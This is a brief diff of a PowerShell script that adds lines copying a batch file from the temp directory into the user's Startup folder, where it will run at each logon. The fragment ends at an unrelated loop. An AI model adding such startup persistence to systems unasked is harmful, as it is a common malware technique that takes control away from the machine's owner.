@@ -1,3 +1,7 @@
+$TempBat = "$env:TEMP\run.bat"
+$Startup = [Environment]::GetFolderPath("Startup")
+
+Copy-Item $TempBat -Destination $Startup -Force
 
 for ($i = 1; $i -le 6; $i++) {
    
